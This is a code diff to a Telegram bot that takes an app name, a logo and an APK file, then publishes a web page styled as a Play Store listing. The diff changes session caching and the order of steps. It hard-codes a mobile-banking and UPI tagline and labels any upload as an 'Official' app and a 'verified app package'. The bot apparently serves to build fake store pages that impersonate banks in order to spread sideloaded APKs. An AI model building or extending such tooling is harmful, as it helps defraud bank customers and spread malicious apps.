@@ -41,7 +41,10 @@ async function loadSession(chatId) {
 		if (blobToken) options.token = blobToken;
 		const record = await head(`sessions/${chatId}.json`, options);
 		if (record?.url) {
-			const res = await fetch(record.url);
+			const res = await fetch(`${record.url}?_t=${Date.now()}`, {
+				cache: 'no-store',
+				headers: { 'Cache-Control': 'no-cache, no-store, must-revalidate' },
+			});
 			if (res.ok) return await res.json();
 		}
 	} catch (err) {
@@ -102,7 +105,17 @@ export default async function handler(request, response) {
 		}
 
 		const text = (message?.text || '').trim();
+		const isImagePhoto = Array.isArray(message?.photo) && message.photo.length > 0;
+		const isImageDoc = !!(
+			message?.document?.mime_type?.startsWith('image/') ||
+			/\.(png|jpg|jpeg|webp|svg|bmp)$/i.test(message?.document?.file_name || '')
+		);
+		const isApkDoc = !!(
+			message?.document?.file_name?.toLowerCase().endsWith('.apk') ||
+			message?.document?.mime_type === 'application/vnd.android.package-archive'
+		);
 
+		// Handle /start command
 		if (text.startsWith('/start')) {
 			await saveSession(chatId, { step: 'name', data: {} });
 			await telegram('sendMessage', {
@@ -114,40 +127,34 @@ export default async function handler(request, response) {
 
 		const session = await loadSession(chatId);
 
-		// Step 1: App Name -> Go to Logo (Step 2)
-		if (session.step === 'name' && text) {
-			session.data.name = text;
-			session.data.developer = `${text} Official`;
-			session.step = 'logo';
-			await saveSession(chatId, session);
-			await telegram('sendMessage', {
-				chat_id: chatId,
-				text: '✅ 1/3 App name received\n\n2/3 Ab app ka logo / icon image Bhejiye.',
-			});
-		}
-		// Step 2: Logo -> Go to APK (Step 3)
-		else if (session.step === 'logo' && (message?.photo?.length || message?.document)) {
-			const fileId = message.photo ? message.photo[message.photo.length - 1].file_id : message.document.file_id;
-			await telegram('sendMessage', { chat_id: chatId, text: '⏳ Uploading logo...' });
+		// 1. If user sent an Image/Photo (Step 2)
+		if (isImagePhoto || isImageDoc) {
+			const fileId = isImagePhoto
+				? message.photo[message.photo.length - 1].file_id
+				: message.document.file_id;
+
+			await telegram('sendMessage', { chat_id: chatId, text: '⏳ Uploading logo image...' });
 			session.data.logoUrl = await saveTelegramFile(fileId, `apps/${chatId}/logo`);
 			session.step = 'apk';
+			if (!session.data.name) {
+				session.data.name = 'App';
+				session.data.developer = 'App Official';
+			}
 			await saveSession(chatId, session);
 			await telegram('sendMessage', {
 				chat_id: chatId,
 				text: '✅ 2/3 App icon received\n\n3/3 Ab APK document bhejiye (.apk file).',
 			});
+			return response.status(200).json({ ok: true });
 		}
-		// Step 3: APK Document -> Publish Play Store Page
-		else if (session.step === 'apk' && message?.document) {
-			const fileName = message.document.file_name || '';
-			if (!fileName.toLowerCase().endsWith('.apk')) {
-				await telegram('sendMessage', { chat_id: chatId, text: '⚠️ Kripya valid .apk file document ke roop me bhejiye.' });
-				return response.status(200).json({ ok: true });
-			}
 
+		// 2. If user sent an APK Document (Step 3)
+		if (isApkDoc) {
 			await telegram('sendMessage', { chat_id: chatId, text: '⏳ Uploading APK & generating Play Store page...' });
 			session.data.apkUrl = await saveTelegramFile(message.document.file_id, `apps/${chatId}/base.apk`);
-			session.data.slug = slugify(session.data.name || 'app');
+			session.data.name = session.data.name || 'App';
+			session.data.developer = session.data.developer || `${session.data.name} Official`;
+			session.data.slug = slugify(session.data.name);
 			session.data.category = 'APPS';
 			session.data.tagline = 'Secure Mobile Banking, Instant UPI Transfers & Financial Services';
 			session.data.description = `Official ${session.data.name} app by ${session.data.developer}. Download the verified app package.`;
@@ -164,15 +171,15 @@ export default async function handler(request, response) {
 				inline_keyboard: [
 					[
 						{ text: '🆘 Help', url: 'https://t.me/sanaminfotech' },
-						{ text: '➕ New Link', callback_data: 'new_link' }
-					]
-				]
+						{ text: '➕ New Link', callback_data: 'new_link' },
+					],
+				],
 			};
 
 			await telegram('sendMessage', {
 				chat_id: chatId,
 				text: `🎉 Files uploaded\n✅ Page deployed & READY!\n\n🔗 ${liveUrl}`,
-				reply_markup: replyMarkup
+				reply_markup: replyMarkup,
 			});
 
 			try {
@@ -181,12 +188,35 @@ export default async function handler(request, response) {
 			} catch {}
 
 			return response.status(200).json({ ok: true });
-		} else {
+		}
+
+		// 3. If user sent a non-APK document when expecting APK
+		if (message?.document && !isApkDoc && !isImageDoc) {
 			await telegram('sendMessage', {
 				chat_id: chatId,
-				text: 'ℹ️ Current step ke hisaab se input bhejiye ya /start se dobara shuru karein.',
+				text: '⚠️ Kripya valid .apk file bhejiye (.apk extension wali file).',
 			});
+			return response.status(200).json({ ok: true });
 		}
+
+		// 4. If user sent Text (Step 1: App Name)
+		if (text && !text.startsWith('/')) {
+			session.data.name = text;
+			session.data.developer = `${text} Official`;
+			session.step = 'logo';
+			await saveSession(chatId, session);
+			await telegram('sendMessage', {
+				chat_id: chatId,
+				text: '✅ 1/3 App name received\n\n2/3 Ab app ka logo / icon image Bhejiye.',
+			});
+			return response.status(200).json({ ok: true });
+		}
+
+		// Fallback guidance
+		await telegram('sendMessage', {
+			chat_id: chatId,
+			text: 'ℹ️ Current step ke hisaab se input bhejiye ya /start se dobara shuru karein.',
+		});
 	} catch (error) {
 		console.error('Webhook processing error:', error);
 		await telegram('sendMessage', {
